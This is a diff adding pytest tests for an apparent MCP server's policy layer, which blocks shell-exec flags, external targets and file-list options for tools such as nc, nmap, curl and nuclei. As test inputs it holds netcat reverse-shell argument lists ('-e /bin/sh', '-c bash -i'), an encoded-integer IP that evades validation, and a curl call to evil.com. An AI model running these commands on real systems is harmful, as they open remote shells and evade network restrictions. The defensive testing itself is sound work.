@@ -329,16 +329,22 @@ class TestCheckPolicy:
 
     @patch("mcp_server.security._allow_external", return_value=False)
     def test_long_flag_value_not_treated_as_target(self, _mock_ext) -> None:
-        """Values of --long-flags must not be treated as network targets."""
-        # --data-string foo: "foo" is a flag value, not a target.
+        """Non-target-shaped values of --long-flags are consumed, not validated.
+
+        Single-label words are intentionally treated as candidate hostnames now
+        (see test_unknown_flag_single_label_target_blocked) — a flag value that
+        is genuinely not a target (a number) must not break, and the real target
+        after it must still resolve correctly.
+        """
+        # --max-rate 100: "100" is a numeric flag value, not a target.
         # (--script is intentionally blocked outright; use a neutral flag here.)
-        check_policy("nmap", ["--data-string", "foo", "10.0.0.1"])
+        check_policy("nmap", ["--max-rate", "100", "10.0.0.1"])
 
     @patch("mcp_server.security._allow_external", return_value=False)
     def test_long_flag_value_with_external_target_still_blocked(self, _mock_ext) -> None:
         """The actual target after a --flag value pair must still be validated."""
         with pytest.raises(ValueError, match="not in a private/local"):
-            check_policy("nmap", ["--data-string", "foo", "8.8.8.8"])
+            check_policy("nmap", ["--max-rate", "100", "8.8.8.8"])
 
     @patch("mcp_server.security._allow_external", return_value=False)
     def test_short_t_flag_not_treated_as_target_flag(self, _mock_ext) -> None:
@@ -351,6 +357,81 @@ class TestCheckPolicy:
         """Unambiguous target flags (--target, -u, --url) must still be validated."""
         with pytest.raises(ValueError, match="not in a private/local"):
             check_policy("sqlmap", ["-u", "http://example.com/page?id=1"])
+
+    # ----- nc/ncat/netcat -e/-c/--exec/--sh-exec/--lua-exec are local RCE (C1) -----
+
+    @pytest.mark.parametrize("tool", ["nc", "ncat", "netcat"])
+    def test_nc_exec_short_flag_blocked(self, tool) -> None:
+        """nc -e /bin/sh spawns a program on the socket (bind/reverse shell)."""
+        with pytest.raises(ValueError, match="exec program"):
+            check_policy(tool, ["-e", "/bin/sh", "10.0.0.1", "4444"])
+
+    @pytest.mark.parametrize("tool", ["nc", "ncat", "netcat"])
+    def test_nc_command_short_flag_blocked(self, tool) -> None:
+        """Traditional nc -c <cmd> runs a shell command on the connection."""
+        with pytest.raises(ValueError, match="shell command"):
+            check_policy(tool, ["-c", "bash -i", "10.0.0.1", "4444"])
+
+    @pytest.mark.parametrize("tool", ["nc", "ncat", "netcat"])
+    def test_nc_exec_long_flag_blocked(self, tool) -> None:
+        with pytest.raises(ValueError, match="--exec"):
+            check_policy(tool, ["--exec", "/bin/sh", "10.0.0.1", "4444"])
+
+    @pytest.mark.parametrize("tool", ["nc", "ncat", "netcat"])
+    def test_nc_sh_exec_long_flag_blocked(self, tool) -> None:
+        with pytest.raises(ValueError, match="--sh-exec"):
+            check_policy(tool, ["--sh-exec", "id", "10.0.0.1", "4444"])
+
+    @pytest.mark.parametrize("tool", ["nc", "ncat", "netcat"])
+    def test_nc_lua_exec_long_flag_blocked(self, tool) -> None:
+        with pytest.raises(ValueError, match="--lua-exec"):
+            check_policy(tool, ["--lua-exec", "x.lua", "10.0.0.1", "4444"])
+
+    def test_nc_exec_joined_long_flag_blocked(self) -> None:
+        """=joined form of the command-bearing long flag must also be blocked."""
+        with pytest.raises(ValueError, match="--exec"):
+            check_policy("ncat", ["--exec=/bin/sh", "10.0.0.1", "4444"])
+
+    @patch("mcp_server.security._allow_external", return_value=False)
+    def test_nc_benign_connect_allowed(self, _mock_ext) -> None:
+        """A benign port-check still passes (no exec flag present)."""
+        check_policy("nc", ["-zv", "10.0.0.1", "80"])
+
+    # ----- dig/host "@resolver" must be validated against the allowlist (C2) -----
+
+    @patch("mcp_server.security._allow_external", return_value=False)
+    def test_dig_at_external_resolver_blocked(self, _mock_ext) -> None:
+        """dig @8.8.8.8 localhost otherwise reaches a public resolver."""
+        with pytest.raises(ValueError, match="not in a private/local"):
+            check_policy("dig", ["@8.8.8.8", "localhost"])
+
+    @patch("mcp_server.security._allow_external", return_value=False)
+    def test_dig_at_private_resolver_allowed(self, _mock_ext) -> None:
+        """An internal @<private-ip> resolver is permitted by default."""
+        check_policy("dig", ["@10.0.0.1", "localhost"])
+
+    @patch("mcp_server.security._allow_external", return_value=True)
+    def test_dig_at_external_resolver_allowed_with_env(self, _mock_ext) -> None:
+        check_policy("dig", ["@8.8.8.8", "localhost"])
+
+    # ----- token after an UNKNOWN flag must still be target-validated (C3) -----
+
+    @patch("mcp_server.security._allow_external", return_value=False)
+    def test_unknown_flag_encoded_int_target_blocked(self, _mock_ext) -> None:
+        """nc --unknownflag 134744072 (== 8.8.8.8) must not slip past validation."""
+        with pytest.raises(ValueError, match="not in a private/local"):
+            check_policy("nc", ["--unknownflag", "134744072"])
+
+    @patch("mcp_server.security._allow_external", return_value=False)
+    def test_unknown_flag_single_label_target_blocked(self, _mock_ext) -> None:
+        """A bare single-label host after an unknown flag is still validated."""
+        with pytest.raises(ValueError, match="not in a private/local"):
+            check_policy("nc", ["--unknownflag", "scanme"])
+
+    @patch("mcp_server.security._allow_external", return_value=False)
+    def test_unknown_flag_numeric_value_consumed(self, _mock_ext) -> None:
+        """A bare port/number after an unknown flag is a flag value, not a target."""
+        check_policy("nc", ["--unknownflag", "4444", "10.0.0.1", "80"])
 
 
 # ---------------------------------------------------------------------------
@@ -794,6 +875,55 @@ class TestSystemUtilityNetworkPolicy:
         with pytest.raises(ValueError, match=r"target 'http://evil\.com/'"):
             check_policy("curl", ["-u", "admin:pass", "http://evil.com/"])
 
+    @patch("mcp_server.security._allow_external", return_value=False)
+    def test_curl_header_value_not_treated_as_target(self, _mock_ext) -> None:
+        """curl -H 'Authorization: ...' http://10.0.0.1/ → allowed; header is not a target."""
+        check_policy("curl", ["-H", "Authorization: Bearer abc123", "http://10.0.0.1/"])
+        check_policy("curl", ["--header=X-Test: value", "http://10.0.0.1/"])
+
+    @patch("mcp_server.security._allow_external", return_value=False)
+    def test_curl_header_with_external_url_still_blocks_real_target(self, _mock_ext) -> None:
+        """Header exemptions must not hide the actual destination URL."""
+        with pytest.raises(ValueError, match=r"target 'http://example\.com/'"):
+            check_policy("curl", ["-H", "Authorization: Bearer abc123", "http://example.com/"])
+
+    @patch("mcp_server.security._allow_external", return_value=False)
+    def test_scanner_non_target_flag_values_allowed_with_private_url(self, _mock_ext) -> None:
+        """Common wordlist/header/template flags are values, not extra network targets."""
+        check_policy("ffuf", ["-w", "words", "-u", "http://10.0.0.1/FUZZ"])
+        check_policy("gobuster", ["dir", "-w", "raft-small-words", "-u", "http://10.0.0.1/"])
+        check_policy("nuclei", ["-t", "cves/", "-H", "X-Test: value", "-u", "http://10.0.0.1/"])
+        check_policy("httpx", ["-H", "Authorization: Bearer abc123", "-u", "http://10.0.0.1/"])
+
+    @pytest.mark.parametrize(
+        "tool,args",
+        [
+            ("nuclei", ["-t", "http://example.com/template.yaml", "-u", "http://10.0.0.1/"]),
+            ("nuclei", ["-templates=http://example.com/template.yaml", "-u", "http://10.0.0.1/"]),
+            ("ffuf", ["-w", "http://example.com/words.txt", "-u", "http://10.0.0.1/FUZZ"]),
+            ("ffuf", ["-whttp://example.com/words.txt", "-u", "http://10.0.0.1/FUZZ"]),
+            ("gobuster", ["dir", "-w", "http://example.com/words.txt", "-u", "http://10.0.0.1/"]),
+            ("feroxbuster", ["-w", "http://example.com/words.txt", "-u", "http://10.0.0.1/"]),
+        ],
+    )
+    @patch("mcp_server.security._allow_external", return_value=False)
+    def test_scanner_resource_url_flags_block_external_fetches(self, _mock_ext, tool, args) -> None:
+        """Template/wordlist URL values can fetch remote resources, so default-safe mode blocks them."""
+        with pytest.raises(ValueError, match="remote resource"):
+            check_policy(tool, args)
+
+    @patch("mcp_server.security._allow_external", return_value=False)
+    def test_scanner_resource_url_flags_allow_private_fetches(self, _mock_ext) -> None:
+        """Private remote resource URLs are allowed under the same default-safe target policy."""
+        check_policy("nuclei", ["-t", "http://10.0.0.1/template.yaml", "-u", "http://10.0.0.2/"])
+        check_policy("ffuf", ["-w", "http://10.0.0.1/words.txt", "-u", "http://10.0.0.2/FUZZ"])
+
+    @patch("mcp_server.security._allow_external", return_value=False)
+    def test_scanner_non_target_flags_do_not_hide_external_url(self, _mock_ext) -> None:
+        """Exempting wordlist/header values must not bypass validation of the real URL."""
+        with pytest.raises(ValueError, match="not in a private/local"):
+            check_policy("ffuf", ["-w", "words", "-u", "http://example.com/FUZZ"])
+
     # -u is a legitimate target flag for sqlmap/nuclei/ffuf etc., keep validation there.
     @patch("mcp_server.security._allow_external", return_value=False)
     def test_sqlmap_dash_u_still_validates_target(self, _mock_ext) -> None:
@@ -826,6 +956,95 @@ class TestSystemUtilityNetworkPolicy:
         """wget --input-file=urls.txt → blocked."""
         with pytest.raises(ValueError, match="URL list"):
             check_policy("wget", ["--input-file=urls.txt"])
+
+    @patch("mcp_server.security._allow_external", return_value=False)
+    def test_nuclei_list_short_flag_blocked(self, _mock_ext) -> None:
+        """nuclei -l targets.txt → blocked (target list from file bypasses validation)."""
+        with pytest.raises(ValueError, match="target list"):
+            check_policy("nuclei", ["-l", "targets.txt"])
+
+    @patch("mcp_server.security._allow_external", return_value=False)
+    def test_nuclei_list_long_flag_blocked(self, _mock_ext) -> None:
+        """nuclei -list targets.txt → blocked."""
+        with pytest.raises(ValueError, match="target list"):
+            check_policy("nuclei", ["-list", "targets.txt"])
+
+    @patch("mcp_server.security._allow_external", return_value=False)
+    def test_nuclei_single_target_flags_allowed(self, _mock_ext) -> None:
+        """nuclei -t cves/ -u http://10.0.0.1/ → allowed (template + single private target)."""
+        check_policy("nuclei", ["-t", "cves/", "-u", "http://10.0.0.1/"])
+
+    @patch("mcp_server.security._allow_external", return_value=False)
+    def test_httpx_list_flag_blocked(self, _mock_ext) -> None:
+        """httpx -l targets.txt → blocked."""
+        with pytest.raises(ValueError, match="target list"):
+            check_policy("httpx", ["-l", "targets.txt"])
+
+    @patch("mcp_server.security._allow_external", return_value=False)
+    def test_subfinder_list_flag_blocked(self, _mock_ext) -> None:
+        """subfinder -dL domains.txt → blocked (domain list from file)."""
+        with pytest.raises(ValueError, match="domain list"):
+            check_policy("subfinder", ["-dL", "domains.txt"])
+
+    @patch("mcp_server.security._allow_external", return_value=False)
+    def test_amass_domain_file_flag_blocked(self, _mock_ext) -> None:
+        """amass -df domains.txt → blocked."""
+        with pytest.raises(ValueError, match="domain list"):
+            check_policy("amass", ["-df", "domains.txt"])
+
+    @patch("mcp_server.security._allow_external", return_value=False)
+    def test_arjun_input_flag_blocked(self, _mock_ext) -> None:
+        """arjun -i urls.txt → blocked (URL list from file)."""
+        with pytest.raises(ValueError, match="URL list"):
+            check_policy("arjun", ["-i", "urls.txt"])
+
+    @patch("mcp_server.security._allow_external", return_value=False)
+    def test_whatweb_input_file_flag_blocked(self, _mock_ext) -> None:
+        """whatweb --input-file=targets.txt → blocked."""
+        with pytest.raises(ValueError, match="target list"):
+            check_policy("whatweb", ["--input-file=targets.txt"])
+
+    # ----- Regression: =joined and attached single-token forms of the file-list flags -----
+    @pytest.mark.parametrize(
+        "tool,arg",
+        [
+            # CLI parsers differ by tool/version; the policy layer fails closed
+            # for both =joined and attached forms of file-list/config flags.
+            ("nmap", "-iL=targets.txt"),
+            ("nmap", "-iLtargets.txt"),
+            ("nmap", "-iR1000"),
+            ("masscan", "--includefile=targets.txt"),
+            ("nuclei", "-l=targets.txt"),
+            ("nuclei", "-ltargets.txt"),
+            ("httpx", "-l=targets.txt"),
+            ("httpx", "-ltargets.txt"),
+            ("subfinder", "-dL=domains.txt"),
+            ("subfinder", "-dLdomains.txt"),
+            ("subfinder", "-list=domains.txt"),
+            ("amass", "-df=domains.txt"),
+            ("amass", "-dfdomains.txt"),
+            # argparse/OptionParser/getopt tools: =joined AND attached forms
+            ("arjun", "-i=urls.txt"),
+            ("arjun", "-iurls.txt"),
+            ("arjun", "--input=urls.txt"),
+            ("whatweb", "-iurls.txt"),
+            ("curl", "-Kcfg.txt"),
+            ("curl", "-K=cfg.txt"),
+            ("wget", "-i=/dev/null"),
+            ("wget", "-iurls.txt"),
+        ],
+    )
+    @patch("mcp_server.security._allow_external", return_value=False)
+    def test_file_list_flag_variants_blocked(self, _mock_ext, tool, arg) -> None:
+        """=joined / attached file-list flag forms must be blocked, not just `-flag file`."""
+        with pytest.raises(ValueError):
+            check_policy(tool, [arg])
+
+    @patch("mcp_server.security._allow_external", return_value=False)
+    def test_httpx_location_flag_not_overblocked(self, _mock_ext) -> None:
+        """A legit -location flag (shares the -l prefix) must NOT be blocked."""
+        check_policy("httpx", ["-location", "-u", "http://10.0.0.1/"])
+        check_policy("httpx", ["-location=true", "-u", "http://10.0.0.1/"])
 
 
 class TestSystemUtilityRemote:
